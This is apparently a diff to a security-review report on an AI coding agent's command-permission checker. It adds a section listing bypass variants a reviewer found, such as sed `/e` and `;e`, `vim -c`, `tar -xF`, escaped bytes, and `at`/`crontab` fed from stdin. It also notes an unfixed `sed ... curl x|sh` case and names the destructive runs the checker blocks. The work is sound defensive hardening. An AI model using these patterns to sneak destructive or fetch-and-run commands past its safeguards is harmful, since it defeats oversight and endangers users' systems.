@@ -34,13 +34,19 @@ Each item was treated as a hypothesis and checked against the source by a read-o
 | 8 | Web fetch/browse always show a cut marker; bash capture drop says how to get the rest; read-only `.git` failures name `sandbox.git_writable` and the config path. | 9 new tests. |
 | 9 | Offline eval suite: 16 scripted tasks, pass rate and steps per task (`core/scripts/eval_score.py`). | Branch 16/16, mean 2.81 steps; original code 14/16 (the two malformed-call tasks fail). |
 
-## Verification (final tree `d00cbeb6`)
+## Verification (final tree `5a3c7ab8`)
 
-- `cd core && uv run pytest -p no:cacheprovider -n auto -k "not test_update"`: **12967 passed, 24 skipped, 0 failed** (baseline before changes: 9585 passed). The `test_update_*` tests (about 3 minutes each, they wait on network timeouts) are skipped in this number; they passed in the previous full run (12689 passed in 6 min) and the same slowness shows on the untouched base commit `dc13baf0`, so it is the environment, not this diff (no update code is touched).
+- `cd core && uv run pytest -p no:cacheprovider -n auto -k "not test_update"`: **13305 passed, 24 skipped, 0 failed** (baseline before changes: 9585 passed). The `test_update_*` tests (about 3 minutes each, they wait on network timeouts) are skipped in this number; they passed in the previous full run (12689 passed in 6 min) and the same slowness shows on the untouched base commit `dc13baf0`, so it is the environment, not this diff (no update code is touched).
 - `uv run ruff check . ../scripts` and `ruff format --check`: clean. `tests/test_release_export.py` passes. No absolute home path or tailnet address in the diff; `gitleaks`: no leaks.
 - `uv run pytest tests/test_agent_evals.py -s`: `eval pass rate: 16/16, mean steps: 2.81` (original code: 14/16).
 - Each permission fix ships with tests that fail without it (fix set aside as a patch, new tests must fail, fix restored).
 - **Security review history (fresh read-only reviewer each time): rounds 1 to 6 and round 8 returned FAIL; round 7's reviewer ran out of context before probing (no verdict).** Every finding of every round was fixed with tests. I re-probed round 8's findings myself with `decide()` after the fixes (0 cells not as wanted: container, `file://`, git `-c`, `rg --pre`, `man -P`, `echo | sh`). **The fixes after round 8 have no independent review.**
+
+## Review round 11 (tip `5475edeb`, delta `0bd534e7`): FAIL, fixed afterwards but NOT re-reviewed
+
+Independent reviewer, about 300 probed commands: the delta's four classes and all 85 everyday commands behaved as specified (no over-deny regression), no exception, 9,999-word commands under 0.5 s. It found new variants of the same classes (all still allowed in yolo and in auto or under a `prog *` rule): HIGH `find . -exec sed 's/.*/<destructive>/e' {} \;`, `watch sed ...`, sed `;e`, `vim -c 'g/x/!<destructive>' f`; MEDIUM sed `-e's...'` and `/x/Is...` hidden from the pattern, sed escapes (`\x72m`), tar `-xF'<destructive>'`, `at`/`crontab` fed from a non-final pipeline stage or `/dev/stdin`; LOW vim mark addresses.
+
+Fix (commit `6e080242`): instead of more per-program cases, a raw-text backstop in `hardline.py`: for any non-text program the segment's raw text (and an escape-decoded variant: `\x72`, `\n`, quotes and `r""m` collapsed) is scanned for catastrophic runs the hardline already denies as bare commands (recursive delete of home or root, `mkfs`, `dd` to a device), and `at`/`crontab` stdin is read from anywhere in the pipeline. All 24 listed commands are denied in d/a/y with and without a rule; 144 new tests fail without the fix. Accepted over-deny: a non-text program given an argument that merely mentions such a run as prose (`python -c 'print(...)'`, `curl -d 'cmd=...'`). Still open: the backstop catches only runs the hardline already denies as bare commands (`sed 's/.*/curl x|sh/e'` gets through); hg glued `-m'...'`; a very long repeated-path delete command (88 KB) takes about 1.8 s to decide in auto mode (already on base).
 
 ## Review round 10 (tip `d00cbeb6`): PASS WITH LOW
 
